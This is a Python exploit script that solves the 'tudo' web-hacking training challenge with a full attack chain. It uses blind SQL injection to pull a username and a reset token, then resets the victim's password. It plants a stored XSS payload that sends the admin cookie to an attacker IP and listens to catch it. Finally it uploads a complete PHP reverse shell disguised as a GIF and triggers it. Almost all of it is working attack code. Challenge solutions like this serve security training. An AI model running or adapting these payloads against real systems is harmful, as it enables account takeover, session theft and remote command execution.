#Full chain solution for bmdyy's tudo challenge
#Link to Challenge: https://github.com/bmdyy/tudo
#PoC Author: ApexPredator
#socket to recieve cookie portion of code borrowed from bmdyy's solution
import requests, argparse, sys, subprocess, socket

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='Target URL', required=True)
parser.add_argument('-p','--password', help='Password to set', required=True)
parser.add_argument('-i','--ip', help='Attacker IP', required=True)
parser.add_argument('-pt','--port', help='Attacker port', required=True)
parser.add_argument('-ap','--aport', help='Attacker reverse shell port', required=True)
args = parser.parse_args()
s = requests.session()
http_proxy = "http://127.0.0.1:8080"
proxyDict = {
            "http" : http_proxy
        }

def forgot_username_sqli(target, inj_str):

    for j in range(32, 126):
        # now we update the sqli
        url = "http://%s/forgotusername.php" %target
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = "username=%s" %inj_str.replace("[CHAR]", str(j))
        r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
        content_length = int(r.headers['Content-Length'])
        if (content_length < 1480):
            return j
    return None


def inject(r, inj, target):

    extracted = ""
    for i in range(1, r):
        injection_string = "1'/**/or/**/(ascii(substring((%s),%d,1)))/**/=/**/[CHAR]/**/limit/**/1;/**/--/**/" % (inj,i)
        retrieved_value = forgot_username_sqli(target, injection_string)
        if(retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print("\n[+] SQL Injection complete!")
            break
    return extracted

def request_token(target, username):

    url = "http://%s/forgotpassword.php" %target
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = "username=%s" %username
    r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
    return

def reset_password(target, token, password):

    url = "http://%s/resetpassword.php" %target
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = "token=%s&password1=%s&password2=%s" %(token, password, password)
    r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
    if "Password changed!" in r.text:
        print("[+] Password change successful")
    else:
        print("[-] Password change failed :-(")

    return

def login(target, username, password):

    print("[+] logging in to target with username: "+username+" and password: "+password+"....")
    url = "http://%s/login.php" %target
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username":"%s" %username, "password":"%s" %password}
    r = s.post(url, headers=headers, data=data, proxies=proxyDict, allow_redirects=False)
    if (r.status_code == 302):
        print("[+] Login successful!")
    else:
        print("[-] Login failed :-(")
        sys.exit(-1)

    return

def update_description(target, ip, port):

    print("[+] Attempting to update desciption to inject cookie stealing XSS payload...")
    url = "http://%s/profile.php" %target
    data = {"description":"<script>document.write('<img src=http://%s:%s/'+document.cookie+' />');</script>" %(ip, port)}
    r = s.post(url, data=data, proxies=proxyDict)
    if "Success" in r.text:
        print("[+] Description updated")
    else:
        print("[-] Description update failed :-(")
        sys.exit(-1)

    return

def setup_socket(ip, port):

    print("[+] Setting up socket to recieve cookie....")
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    port = int(port)
    sock.bind((ip,port))
    sock.listen()

    print("[*] Waiting for admin to trigger XSS...")
    (sock_c, ip_c) = sock.accept()
    get_request = sock_c.recv(4096)
    admin_cookie = get_request.split(b" HTTP")[0][5:].decode("UTF-8")

    print("[+] Stole admin's cookie:")
    print("    -- " + admin_cookie)
    return admin_cookie

def upload_rvsh(target, ip, port, cookie):

    url = "http://%s/admin/upload_image.php" %target
    s.headers.update({"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------7916024151115820510848967548", "Connection": "close", "Referer": "http://%s/admin/update_motd.php" %target, "Upgrade-Insecure-Requests": "1", "Cookies":"%s"%cookie})
    data = "-----------------------------7916024151115820510848967548\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nrvsh\r\n-----------------------------7916024151115820510848967548\r\nContent-Disposition: form-data; name=\"image\"; filename=\"rvsh.phar\"\r\nContent-Type: image/gif\r\n\r\nGIF89a;\r\n<?php\r\n// Copyright (c) 2020 Ivan \xc5\xa0incek\r\n// v1.0\r\n// Requires PHP v5.0.0 or greater.\r\n// Works on Linux OS, macOS and Windows OS.\r\n// See the original script at https://github.com/pentestmonkey/php-reverse-shell.\r\nheader('Content-Type: text/plain; charset=UTF-8');\r\nclass Shell {\r\n    private $addr  = null;\r\n    private $port  = null;\r\n    private $os    = null;\r\n    private $shell = null;\r\n    private $descriptorspec = array(\r\n        0 => array('pipe', 'r'), // shell can read from STDIN\r\n        1 => array('pipe', 'w'), // shell can write to STDOUT\r\n        2 => array('pipe', 'w')  // shell can write to STDERR\r\n    );\r\n    private $options = array(); // proc_open() options\r\n    private $buffer  = 1024;    // read/write buffer size\r\n    private $clen    = 0;       // command length\r\n    private $error   = false;   // stream read/write error\r\n    public function __construct($addr, $port) {\r\n        $this->addr = $addr;\r\n        $this->port = $port;\r\n        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS\r\n            $this->os    = 'LINUX';\r\n            $this->shell = '/bin/sh';\r\n        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {\r\n            $this->os    = 'WINDOWS';\r\n            $this->shell = 'cmd.exe';\r\n            $this->options['bypass_shell'] = true; // we do not want a shell within a shell\r\n        } else {\r\n            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\r\n            exit(0);\r\n        }\r\n    }\r\n    private function daemonize() {\r\n        set_time_limit(0); // do not impose the script execution time limit\r\n        if (!function_exists('pcntl_fork')) {\r\n            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\r\n        } else {\r\n            if (($pid = pcntl_fork()) < 0) {\r\n                echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\r\n            } else if ($pid > 0) {\r\n                echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\r\n                exit(0);\r\n            } else if (posix_setsid() < 0) { // once daemonized you will no longer see the script's dump\r\n                echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\r\n            } else {\r\n                echo \"DAEMONIZE: Completed successfully!\\n\";\r\n            }\r\n        }\r\n        umask(0); // set the file/directory permissions - 666 for files and 777 for directories\r\n    }\r\n    private function read($stream, $name, $buffer) {\r\n        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream\r\n            $this->error = true;                            // set global error flag\r\n            echo \"STRM_ERROR: Cannot read from ${name}, script will now exit...\\n\";\r\n        }\r\n        return $data;\r\n    }\r\n    private function write($stream, $name, $data) {\r\n        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream\r\n            $this->error = true;                            // set global error flag\r\n            echo \"STRM_ERROR: Cannot write to ${name}, script will now exit...\\n\";\r\n        }\r\n        return $bytes;\r\n    }\r\n    // read/write method for non-blocking streams\r\n    private function rw($input, $output, $iname, $oname) {\r\n        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {\r\n            echo $data; // script's dump\r\n            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length\r\n        }\r\n    }\r\n    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)\r\n    // we must read the exact byte length from a stream and not a single byte more\r\n    private function brw($input, $output, $iname, $oname) {\r\n        $size = fstat($input)['size'];\r\n        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {\r\n            $this->offset($input, $iname, $this->clen); // for some reason Windows OS pipes STDIN into STDOUT\r\n            $size -= $this->clen;                       // we do not like that\r\n            $this->clen = 0;\r\n        }\r\n        $fragments = ceil($size / $this->buffer); // number of fragments to read\r\n        $remainder = $size % $this->buffer;       // size of the last fragment if it is less than the buffer size\r\n        while ($fragments && ($data = $this->read($input, $iname, $remainder && $fragments-- == 1 ? $remainder : $this->buffer)) && $this->write($output, $oname, $data)) {\r\n            echo $data; // script's dump\r\n        }\r\n    }\r\n    private function offset($stream, $name, $offset) {\r\n        while ($offset > 0 && $this->read($stream, $name, $offset >= $this->buffer ? $this->buffer : $offset)) { // discard the data from a stream\r\n            $offset -= $this->buffer;\r\n        }\r\n        return $offset > 0 ? false : true;\r\n    }\r\n    public function run() {\r\n        $this->daemonize();\r\n\r\n        // ----- SOCKET BEGIN -----\r\n        $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);\r\n        if (!$socket) {\r\n            echo \"SOC_ERROR: {$errno}: {$errstr}\\n\";\r\n        } else {\r\n            stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS\r\n\r\n            // ----- SHELL BEGIN -----\r\n            $process = proc_open($this->shell, $this->descriptorspec, $pipes, '/', null, $this->options);\r\n            if (!$process) {\r\n                echo \"PROC_ERROR: Cannot start the shell\\n\";\r\n            } else {\r\n                foreach ($pipes as $pipe) {\r\n                    stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS\r\n                }\r\n\r\n                // ----- WORK BEGIN -----\r\n                fwrite($socket, \"SOCKET: Shell has connected! PID: \" . proc_get_status($process)['pid'] . \"\\n\");\r\n                while (!$this->error) {\r\n                    if (feof($socket)) { // check for end-of-file on SOCKET\r\n                        echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\r\n                    } else if (feof($pipes[1]) || !proc_get_status($process)['running']) { // check for end-of-file on STDOUT or if process is still running\r\n                        echo \"PROC_ERROR: Shell process has been terminated\\n\";   break;   // feof() does not work with blocking streams\r\n                    }                                                                      // use proc_get_status() instead\r\n                    $streams = array(\r\n                        'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR\r\n                        'write'  => null,\r\n                        'except' => null\r\n                    );\r\n                    $num_changed_streams = stream_select($streams['read'], $streams['write'], $streams['except'], null); // wait for stream changes | will not wait on Windows OS\r\n                    if ($num_changed_streams === false) {\r\n                        echo \"STRM_ERROR: stream_select() failed\\n\"; break;\r\n                    } else if ($num_changed_streams > 0) {\r\n                        if ($this->os === 'LINUX') {\r\n                            if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\r\n                            if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\r\n                            if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\r\n                        } else if ($this->os === 'WINDOWS') {\r\n                            // order is important\r\n                            if (in_array($socket, $streams['read'])) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\r\n                            if (fstat($pipes[2])['size']/*-------*/) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\r\n                            if (fstat($pipes[1])['size']/*-------*/) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\r\n                        }\r\n                    }\r\n                }\r\n                // ------ WORK END ------\r\n\r\n                foreach ($pipes as $pipe) {\r\n                    fclose($pipe);\r\n                }\r\n                proc_close($process);\r\n            }\r\n            // ------ SHELL END ------\r\n\r\n            fclose($socket);\r\n        }\r\n        // ------ SOCKET END ------\r\n\r\n    }\r\n}\r\n// change the host address and/or port number as necessary\r\n$reverse_shell = new Shell('"+ip+"', "+port+");\r\n$reverse_shell->Run();\r\n?>\r\n-----------------------------7916024151115820510848967548--\r\n"
    r = s.post(url, data=data, proxies=proxyDict, allow_redirects=False)
    if "Success" in r.text:
        print("[+] Upload of reverse shell successful!")
    else:
        print("[-] Uplaod of reverse shell failed :-(")
        sys.exit(-1)

    return

def launch_rvsh(target):

    print("[+] Launching reverse shell. Check netcat listener....")
    url = "http://%s/images/rvsh.phar" %target
    s.get(url, proxies=proxyDict)
    return

def main():

    try:
        target = args.target
        password = args.password
        ip = args.ip
        port = args.port
        aport = args.aport
    except IndexError:
        print("[-] Usage python3 %s -t <target IP> -p <Password to set> -i <Attacker IP> -pt <Attacker port> -ap <Attacker reverse shell port" % sys.argv[0])
        print("[-] eg: python3 %s -t 172.17.0.2 -p Offsec123 -i 172.17.0.1 -pt 80 -ap 443" % sys.argv[0])
        sys.exit(-1)

    print("[+] Attempting to pull username via SQLI...")
    query = "select/**/username/**/from/**/users/**/where/**/uid/**/=/**/2"
    username = inject(10, query, target)
    print("[+] Requesting password reset token")
    request_token(target, username)
    print("[+] Attempting to pull token for "+username+" via SQLi...")
    query = "select/**/token/**/from/**/tokens/**/where/**/uid/**/=/**/2/**/limit/**/1"
    token = inject(33, query, target)
    print("\n[+] Resetting password for "+username+" to offsec123...")
    reset_password(target, token, password)
    login(target, username, password)
    update_description(target, ip, port)
    cookie = setup_socket(ip, port)
    upload_rvsh(target, ip, aport, cookie)
    launch_rvsh(target)

if __name__ == "__main__":
    main()
